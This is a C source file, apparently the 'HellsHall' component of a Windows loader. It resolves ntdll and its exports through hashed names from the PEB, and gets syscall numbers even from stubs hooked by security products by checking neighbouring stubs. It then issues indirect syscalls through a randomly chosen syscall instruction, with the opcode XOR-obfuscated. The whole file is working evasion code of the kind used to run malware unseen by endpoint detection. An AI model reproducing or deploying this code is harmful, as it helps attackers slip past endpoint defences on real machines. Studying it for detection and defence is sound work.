#include "HellsHall.h"

#define GET_ARRAY_COUNT(Array,DataType) sizeof(Array) / sizeof(DataType)
#define TO_LOWER(Char) Char + 0x20
extern VOID SetSyscallPointer(PSYSTEM_CALL pSyscallAddress);
extern NTSTATUS SystemCall();
#define SET_SYSCALL_POINTER(Syscall) SetSyscallPointer(((PSYSTEM_CALL)&(Syscall)));

DLL						g_Ntdll = { 0 };
SYSTEM_CALLS_TABLE		g_SystemCalls = { 0 };
DWORD					g_SyscallHashes[] = {NT_API_FUNCTION_HASH_LIST};
volatile WORD			g_SYSCALL_OPCODE = OBFUSCATED_SYSCALL;
int						g_PreviousRandSeed = 0;

// Linear Congruential Generator (LCG) rng
int _srand(int seed) {
	unsigned int a = 1664525;
	unsigned int c = 1013904223;
	unsigned int m = 0xFFFFFFFF;
	seed = (int)((a * seed + c) % m);
	g_PreviousRandSeed = seed;
	return seed;
}

int _rand() {
	return _srand(g_PreviousRandSeed);
}

DWORD GetCurrentProcId() {
	return (DWORD)(ULONG_PTR)((PTEB)(__readgsqword(0x30)))->ClientId.UniqueProcess;
}

DWORD HashStringSdbmA(_In_ LPCSTR String)
{
	ULONG Hash = HASH_SEED;
	INT c;

	while (c = *String++)
		Hash = c + (Hash << 6) + (Hash << 16) - Hash;

	return Hash;
}

HMODULE GetModuleHandleH(DWORD Hash) {

	CHAR					ModuleName[MAX_PATH];
	CHAR				    Letter = 0;
	INT						Index = 0;
	PLDR_DATA_TABLE_ENTRY	pLoadedModule = 0;
	PPEB					pPeb = (PPEB)__readgsqword(0x60);
	if (!pPeb) 
		return NULL;
	
	for (
		pLoadedModule = (PLDR_DATA_TABLE_ENTRY)pPeb->Ldr->InLoadOrderModuleList.Flink;
		pLoadedModule->DllBase != NULL;
		pLoadedModule = (PLDR_DATA_TABLE_ENTRY)pLoadedModule->InLoadOrderLinks.Flink
		) {
		if (pLoadedModule->BaseDllName.Length && pLoadedModule->BaseDllName.Length < MAX_PATH) {
			for (Index = 0; Index < pLoadedModule->BaseDllName.Length; Index++) {
				Letter = (CHAR)(pLoadedModule->BaseDllName.Buffer[Index]);
				ModuleName[Index] = (Letter >= 'A' && Letter <= 'Z' && Letter != 0x00) ? Letter + 0x20 : Letter;
			}
			ModuleName[Index++] = '\0';
			if (HashStringSdbmA(ModuleName) == Hash) {
				return (HMODULE)pLoadedModule->DllBase;
			}
		}
	}

	return NULL;

}

BOOL InitializeModuleConfig(PDLL pDll, ULONG_PTR BaseAddress)
{
	pDll->DllBaseAddress = BaseAddress;

	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)(pDll->DllBaseAddress);
	if (pDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		dbg_print("[InitializeModuleConfig] ---> Dos signature mismatch.");
		return FALSE;
	}

	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)(pDll->DllBaseAddress + pDOSHeader->e_lfanew);
	if (pNTHeaders->Signature != IMAGE_NT_SIGNATURE) {
		dbg_print("[InitializeModuleConfig] ---> Nt signature mismatch.");
		return FALSE;
	}

	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(pDll->DllBaseAddress + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	pDll->Addresses		= (PDWORD)(pDll->DllBaseAddress + pExportDirectory->AddressOfFunctions);
	pDll->Names			= (PDWORD)(pDll->DllBaseAddress + pExportDirectory->AddressOfNames);
	pDll->Ordinals		= (PWORD)(pDll->DllBaseAddress + pExportDirectory->AddressOfNameOrdinals);
	pDll->NumberOfNames = pExportDirectory->NumberOfNames;

	if (!pDll->Addresses ||
		!pDll->Names ||
		!pDll->Ordinals ||
		!pDll->NumberOfNames) {
		dbg_print("[InitializeModuleConfig] ---> Could not retrieve one or more DLL structure members.\n")
		return FALSE;
	}

	return TRUE;
}

PVOID GetRandomSyscallInstruction()
{
	for (unsigned int i = (_rand() % g_Ntdll.NumberOfNames); i < g_Ntdll.NumberOfNames; i++)
	{
		PBYTE pFuncAddr = (PBYTE)(g_Ntdll.DllBaseAddress + g_Ntdll.Addresses[g_Ntdll.Ordinals[i]]);

		for (unsigned int ii = 0; ii < 32; ii++) {
			if ((*(PWORD)&pFuncAddr[ii] ^ SYSCALL_XOR_KEY) == g_SYSCALL_OPCODE && pFuncAddr[ii + 2] == RET) {
				dbg_print("[GetRandomSyscallInstruction] ---> Got syscall address for %s at 0x%p\n", (PCHAR)(g_Ntdll.DllBaseAddress + g_Ntdll.Names[i]), &pFuncAddr[ii]);
				return &pFuncAddr[ii];
			}
		}
	}

	return GetRandomSyscallInstruction();
}


BOOL GetSystemCall(DWORD dwHash, PSYSTEM_CALL pSyscall)
{
	for (unsigned int i = 0; i < g_Ntdll.NumberOfNames; i++) {

		PCHAR pFuncName = (PCHAR)(g_Ntdll.DllBaseAddress + g_Ntdll.Names[i]);
		PBYTE pFuncAddr = (PBYTE)(g_Ntdll.DllBaseAddress + g_Ntdll.Addresses[g_Ntdll.Ordinals[i]]);

		if ((HashStringSdbmA(pFuncName) == dwHash)) {

			if (pFuncAddr[0] == MOV && pFuncAddr[1] == R10 && pFuncAddr[2] == RCX && pFuncAddr[3] == MOV2 && pFuncAddr[6] == 0x00 && pFuncAddr[7] == 0x00) {
				pSyscall->SSN = *(PDWORD)(pFuncAddr + 4);
			}

			if (pFuncAddr[0] == JMP || pFuncAddr[3] == JMP) {
				dbg_print("[GetSystemCall] ---> %s is hooked.\n", pFuncName);
				for (int idx = 1; idx <= 255; idx++) {

					/* Check down from the hook for neighboring syscalls */
					if (pFuncAddr[idx * 32] == MOV && pFuncAddr[1 + idx * 32] == R10 && pFuncAddr[2 + idx * 32] == RCX && pFuncAddr[3 + idx * 32] == MOV2
						&& pFuncAddr[6 + idx * 32] == NULL_BYTE && pFuncAddr[7 + idx * 32] == NULL_BYTE) {
						pSyscall->SSN = *(PDWORD)(&pFuncAddr[4 + idx * 32]) - idx;
						break;
					}

					/* Check up from the hook for neighboring syscalls */
					if (pFuncAddr[idx * -32] == MOV && pFuncAddr[1 + idx * -32] == R10 && pFuncAddr[2 + idx * -32] == RCX && pFuncAddr[3 + idx * -32] == MOV2
						&& pFuncAddr[6 + idx * -32] == NULL_BYTE && pFuncAddr[7 + idx * -32] == NULL_BYTE) {
						pSyscall->SSN = *(PDWORD)(&pFuncAddr[4 + idx * -32]) + idx;
						break;
					}
				}
			}
		}

		if ((pSyscall->SSN) != 0) {
			dbg_print("[GetSystemCall] ---> Got SSN (0x%0.8X) for %s\n", pSyscall->SSN, pFuncName);
			if ((pSyscall->JumpAddress = GetRandomSyscallInstruction()) != NULL) {
				return TRUE;
			}
		}
	}
	return FALSE;
}

BOOL InitializeSystemCalls()
{
	int SyscallCount = GET_ARRAY_COUNT(g_SystemCalls, SYSTEM_CALL);
	int HashCount = GET_ARRAY_COUNT(g_SyscallHashes, DWORD);
	PSYSTEM_CALL pSyscall = (PSYSTEM_CALL)(&g_SystemCalls);

	if (SyscallCount != HashCount) {
		dbg_print("[InitializeSystemCalls] ---> The count between system call structure size & hash array size is not exact. Syscalls: %d, Hashes: %d\n", SyscallCount, HashCount);
		return FALSE;
	}

	if (!InitializeModuleConfig(&g_Ntdll, (ULONG_PTR)GetModuleHandleH(NTDLL))) {
			return FALSE;
	}

	_srand(GetCurrentProcId());
	for (int i = 0; i < SyscallCount; i++) {
		if (!GetSystemCall(g_SyscallHashes[i], pSyscall)) {
			dbg_print("[InitializeSystemCalls] ---> Failed to get system call for hash: 0x%0.8X\n", g_SyscallHashes[i]);
			return FALSE;
		}
		pSyscall++;
	}

	return TRUE;

}

